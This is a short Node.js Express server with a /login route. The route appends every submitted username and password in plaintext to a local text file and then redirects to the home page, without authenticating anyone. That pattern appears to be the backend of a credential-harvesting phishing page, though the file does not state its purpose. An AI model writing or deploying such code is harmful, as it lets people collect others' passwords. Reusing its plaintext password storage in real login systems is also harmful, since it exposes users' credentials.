const express=require("express");
const app=express();
const fs=require("fs");
const path=require("path");
const ejs = require('ejs');

app.set("view engine", "ejs");
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/",(req,res)=>{
    res.render("index")
})

app.post("/login",(req,res)=>{
    username=req.body.username;
    pass=req.body.pass;
    let data=`
Username: ${username} password: ${pass}`
    fs.appendFile(`./files/data.txt`,data,(err)=>{
        res.redirect("/");
    })
})

app.listen(3000);